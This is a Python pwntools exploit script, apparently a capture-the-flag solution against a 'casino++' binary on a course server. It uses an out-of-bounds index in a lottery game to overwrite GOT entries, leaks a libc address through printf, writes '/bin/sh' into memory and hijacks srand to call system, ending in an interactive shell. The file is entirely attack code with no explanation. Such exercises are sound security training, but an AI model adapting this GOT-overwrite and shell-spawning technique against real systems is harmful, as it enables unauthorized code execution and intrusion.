from pwn import *

context.arch = 'amd64'
#l = ELF('./libc.so')
conn = remote('edu-ctf.csie.org', 10176)
#conn = process('./casino++')
raw_input()

# overwrite puts, come back casino
conn.sendlineafter("Your name: ", 'a'*0x10 + p64(0x602030))

age = '30'
conn.sendlineafter("Your age: ", age)

casino_addr_hex = 0x000000000040095d
casino_addr_dex = 4196701
print(casino_addr_hex)

name_addr = [str(casino_addr_dex), '0']
idx = ['-43', '-42']
lottery_ans = ['6', '32', '0', '42', '30', '95']

for k in range(2):

    for i in range(6):
        if k == 1:
            conn.sendlineafter(": ", lottery_ans[i])
        else:
            conn.sendlineafter(": ", '101')

    conn.sendlineafter("Change the number? [1:yes 0:no]: ", '1')

    conn.sendlineafter("Which number [1 ~ 6]: ", idx[k])

    conn.sendlineafter(": ", name_addr[k])

# overwrite srand, exec printf

atoi_got_addr = 0x602058
printf_got_addr = 0x602030
guess_addr = 0x6020d0
srand_got_addr = 0x602040

addr_dis = (srand_got_addr - guess_addr) / 4 + 1 

print(addr_dis)
printf_plt_dex = 4196096
print(printf_plt_dex)

name_addr = [str(printf_plt_dex), '0']
idx = [addr_dis, addr_dis + 1]
lottery_ans = ['6', '32', '0', '42', '30', '95']

for x in range(2):
    
    for i in range(6):
        if x == 1:
            conn.sendlineafter(": ", lottery_ans[i])
        else:
            conn.sendlineafter(": ", '101')
    
    conn.sendlineafter("Change the number? [1:yes 0:no]: ", '1')

    conn.sendlineafter("Which number [1 ~ 6]: ", str(idx[x]))

    conn.sendlineafter(": ", name_addr[x])


# overwrite name -> /bin/sh

libc = u64(conn.recv(6) + '\0\0')
print(hex(libc))

l = ELF('./libc.so')
printf_offset = 0x64e80
libc_base = libc - printf_offset
system_offset = 0x4f440
libc_system = libc_base + system_offset
high_bit = libc_system / (2147483648*2)
low_bit = libc_system % (2147483648*2)
print(hex(libc_system))
print(hex(libc_system / (2147483648*2)))
print(hex(libc_system % (2147483648*2)))

# /bin/sh 0x2f62696e -> 6e69622f  / 0x2f73680a -> 0a68732f
#         1852400175     174617391
name_addr = ['1852400175', '174617391']
idx = ['9', '10']


lottery_ans = ['17', '66', '79', '57', '79', '53']
for x in range(2):
    
    for i in range(6):
        if x == 1:
            conn.sendlineafter(": ", lottery_ans[i])
        else:
            conn.sendlineafter(": ", '101')
    
    conn.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
   
    conn.sendlineafter("Which number [1 ~ 6]: ", str(idx[x]))
    
    conn.sendlineafter(": ", name_addr[x])

# over write seed -> name_addr
# 0x6020f0 -> 6299888

name_addr = ['6299888', '0']
idx = ['13', '0']
lottery_ans = ['15', '76', '45', '55', '62', '5']
for x in range(2):
    
    for i in range(6):
        if x == 1:
            conn.sendlineafter(": ", lottery_ans[i])
        else:
            conn.sendlineafter(": ", '101')
    
    conn.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
   
    conn.sendlineafter("Which number [1 ~ 6]: ", str(idx[x]))
    
    conn.sendlineafter(": ", name_addr[x])

# overwrite srand, exec system

name_addr = [str(int(low_bit)), str(int(high_bit))]
addr_dis = (srand_got_addr - guess_addr) / 4 + 1 
idx = [addr_dis, addr_dis + 1]
lottery_ans = ['8', '9', '31', '81', '81', '90']
for x in range(2):
    
    for i in range(6):
        if x == 1:
            conn.sendlineafter(": ", lottery_ans[i])
        else:
            conn.sendlineafter(": ", '101')
    
    conn.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
   
    conn.sendlineafter("Which number [1 ~ 6]: ", str(idx[x]))
    
    conn.sendlineafter(": ", name_addr[x])
    print("suc"+str(x))

conn.interactive()

